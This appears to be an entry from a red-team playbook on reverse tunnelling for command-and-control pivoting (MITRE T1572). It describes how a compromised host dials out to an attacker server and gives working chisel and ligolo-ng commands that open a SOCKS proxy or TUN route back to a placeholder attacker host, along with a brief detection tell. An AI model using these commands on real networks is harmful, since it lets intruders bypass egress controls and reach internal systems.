---
id: reverse-tunnel-chisel
title: Reverse tunnel for C2 pivoting (chisel / ligolo-ng)
section: Command & Control
phase: Command & Control
attack:
  tactic: TA0011
  techniques: [T1572]
platform: [windows, network]
source: MITRE ATT&CK T1572; chisel / ligolo-ng protocol tunneling
pair: reverse-tunnel-detect
---

Punch out of a restricted segment by having the foothold dial *out* to an
attacker-controlled server and tunnel traffic back through that one long-lived
session — chisel multiplexes TCP/UDP over an HTTP/WebSocket-framed link, ligolo-ng
stands up a userland TUN so the whole internal subnet becomes routable from the
attacker box. Because the connection is outbound and encrypted it clears egress
rules that block inbound; the tell is the single persistent outbound session moving
disproportionate, long-duration traffic.

```sh
# chisel: attacker runs the server; victim connects out and reverse-forwards a SOCKS proxy
chisel client https://{{lhost}}:{{port}} R:socks
# ligolo-ng: agent dials the proxy, operator routes the internal subnet through the TUN
ligolo-agent -connect {{lhost}}:{{port}} -ignore-cert
```
